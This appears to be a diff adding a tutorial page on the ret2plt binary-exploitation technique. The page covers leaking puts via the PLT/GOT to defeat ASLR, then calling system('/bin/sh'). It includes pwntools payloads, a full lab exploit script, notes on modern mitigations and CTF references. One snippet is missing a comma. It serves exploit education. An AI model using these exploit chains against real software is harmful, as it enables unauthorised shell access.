@@ -1,0 +1,95 @@
+# Ret2plt
+
+## Basic Information
+
+The goal of this technique would be to **leak an address from a function from the PLT** to be able to bypass ASLR. This is because if, for example, you leak the address of the function `puts` from the libc, you can then **calculate where is the base of `libc`** and calculate offsets to access other functions such as **`system`**.
+
+This can be done with a `pwntools` payload such as ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
+
+```python
+# 32-bit ret2plt
+payload = flat(
+    b'A' * padding,
+    elf.plt['puts'],
+    elf.symbols['main'],
+    elf.got['puts']
+)
+
+# 64-bit
+payload = flat(
+    b'A' * padding,
+    POP_RDI,
+    elf.got['puts']
+    elf.plt['puts'],
+    elf.symbols['main']
+)
+```
+
+Note how **`puts`** (using the address from the PLT) is called with the address of `puts` located in the GOT (Global Offset Table). This is because by the time `puts` prints the GOT entry of puts, this **entry will contain the exact address of `puts` in memory**.
+
+Also note how the address of `main` is used in the exploit so when `puts` ends its execution, the **binary calls `main` again instead of exiting** (so the leaked address will continue to be valid).
+
+> [!CAUTION]
+> Note how in order for this to work the **binary cannot be compiled with PIE** or you must have **found a leak to bypass PIE** in order to know the address of the PLT, GOT and main. Otherwise, you need to bypass PIE first.
+
+You can find a [**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). This was the final exploit from that **example**:
+
+<details>
+<summary>Full exploit example (ret2plt leak + system)</summary>
+
+```python
+from pwn import *
+
+elf = context.binary = ELF('./vuln-32')
+libc = elf.libc
+p = process()
+
+p.recvline()
+
+payload = flat(
+    'A' * 32,
+    elf.plt['puts'],
+    elf.sym['main'],
+    elf.got['puts']
+)
+
+p.sendline(payload)
+
+puts_leak = u32(p.recv(4))
+p.recvlines(2)
+
+libc.address = puts_leak - libc.sym['puts']
+log.success(f'LIBC base: {hex(libc.address)}')
+
+payload = flat(
+    'A' * 32,
+    libc.sym['system'],
+    libc.sym['exit'],
+    next(libc.search(b'/bin/sh\x00'))
+)
+
+p.sendline(payload)
+
+p.interactive()
+```
+
+</details>
+
+## Modern considerations
+
+- **`-fno-plt` builds** (common in modern distros) replace `call foo@plt` with `call [foo@got]`. If the binary has no `foo@plt` stub, you can still leak the resolved address with `puts(elf.got['foo'])` and then **return directly to the GOT entry** (`flat(padding, elf.got['foo'])`) to jump into libc once lazy binding has completed.
+- **Full RELRO / `-Wl,-z,now`**: GOT is read‑only but ret2plt still works for leaks because you only read the GOT slot. If the symbol was never called, your first ret2plt will also perform lazy binding and then print the resolved slot.
+- **ASLR + PIE**: if PIE is enabled, first leak a code pointer (e.g., saved return address, function pointer, or `.plt` entry via another format‑string/infoleak) to compute the PIE base, then build the ret2plt chain with the rebased PLT/GOT addresses.
+- **Non‑x86 architectures with BTI/PAC (AArch64)**: PLT entries are valid BTI landing pads (`bti c`), so when exploiting on BTI‑enabled binaries prefer jumping into the PLT stub (or another BTI‑annotated gadget) instead of directly into a libc gadget without BTI, otherwise the CPU will raise `BRK`/`PAC` failures.
+- **Quick resolution helper**: if the target function is not yet resolved and you need a leak in a single shot, chain the PLT call twice: first `elf.plt['foo']` (to resolve) then again `elf.plt['foo']` with the GOT address as argument to print the now‑filled slot.
+
+## Other examples & References
+
+- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
+  - 64 bit, ASLR enabled but no PIE, the first step is to fill an overflow until the byte 0x00 of the canary to then call puts and leak it. With the canary a ROP gadget is created to call puts to leak the address of puts from the GOT and the a ROP gadget to call `system('/bin/sh')`
+- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
+  - 64 bits, ASLR enabled, no canary, stack overflow in main from a child function. ROP gadget to call puts to leak the address of puts from the GOT and then call an one gadget.
+
+## References
+
+- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)
